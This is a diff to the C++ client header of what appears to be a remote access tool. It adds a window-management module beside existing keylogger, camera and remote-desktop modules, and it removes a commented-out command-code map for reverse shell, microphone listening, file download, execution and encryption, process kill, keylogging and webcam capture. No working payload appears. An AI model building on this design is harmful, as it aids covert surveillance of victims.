@@ -6,6 +6,7 @@
 #include "mod_keylogger.hpp"
 #include "mod_camara.hpp"
 #include "mod_remote_desktop.hpp"
+#include "mod_ventanas.hpp"
 
 struct Paquete {
 	u_int uiTipoPaquete;
@@ -56,6 +57,7 @@ class Cliente {
 		mod_Keylogger*     mod_Key        = nullptr;
 		mod_Camera*        mod_Cam        = nullptr;
 		mod_RemoteDesktop* mod_RemoteDesk = nullptr;
+		mod_AdminVentanas* mod_AdminVen   = nullptr;
 
 		//Map para armar los paquetes entrantes
 		std::map<int, std::vector<char>> paquetes_Acumulados;
@@ -74,50 +76,6 @@ class Cliente {
 		
 	public:
 		SOCKET sckSocket = INVALID_SOCKET;
-
-		/*std::map<std::string, EnumComandos::Enum> Comandos = {
-			{"498", EnumComandos::INIT_PACKET},
-			{"499", EnumComandos::PONG},
-			{"500", EnumComandos::PING},
-			{"501", EnumComandos::Reverse_Shell_Start},
-			{"502", EnumComandos::Reverse_Shell_Command},
-			{"503", EnumComandos::Reverse_Shell_Salida},
-			{"504", EnumComandos::Reverse_Shell_Finish},
-			{"505", EnumComandos::Mic_Refre_Dispositivos},
-			{"506", EnumComandos::Mic_Refre_Resultado},
-			{"507", EnumComandos::Mic_Iniciar_Escucha},
-			{"508", EnumComandos::Mic_Detener_Escucha},
-			{"509", EnumComandos::Mic_Live_Packet},
-			{"510", EnumComandos::FM_Discos},
-			{"512", EnumComandos::FM_Dir_Folder},
-			{"514", EnumComandos::FM_Crear_Folder},
-			{"515", EnumComandos::FM_Crear_Archivo},
-			{"516", EnumComandos::FM_Borrar_Archivo},
-			{"517", EnumComandos::FM_Descargar_Archivo},
-			{"518", EnumComandos::FM_Descargar_Archivo_Recibir},
-			{"519", EnumComandos::FM_Descargar_Archivo_Init},
-			{"520", EnumComandos::FM_Descargar_Archivo_End},
-			{"521", EnumComandos::FM_Ejecutar_Archivo},
-			{"522", EnumComandos::FM_Editar_Archivo},
-			{"524", EnumComandos::FM_Editar_Archivo_Guardar},
-			{"525", EnumComandos::FM_Crypt_Archivo},
-			{"526", EnumComandos::PM_Refrescar},
-			{"527", EnumComandos::PM_Kill},
-			{"529", EnumComandos::KL_Iniciar},
-			{"530", EnumComandos::KL_Detener},
-			{"531", EnumComandos::KL_Salida},
-			{"532", EnumComandos::CM_Lista},
-			{"534", EnumComandos::CM_Single},
-			{"536", EnumComandos::CM_Live_Start},
-			{"537", EnumComandos::CM_Live_Stop},
-			{"538", EnumComandos::FM_Crypt_Confirm},
-			{"540", EnumComandos::RD_Single},
-			{"541", EnumComandos::RD_Start},
-			{"542", EnumComandos::RD_Stop},
-			{"543", EnumComandos::RD_Salida},
-			{"544", EnumComandos::RD_Update_Q},
-			{"545", EnumComandos::RD_Update_Vmouse}
-		};*/
 
 		Cliente();
 		~Cliente();
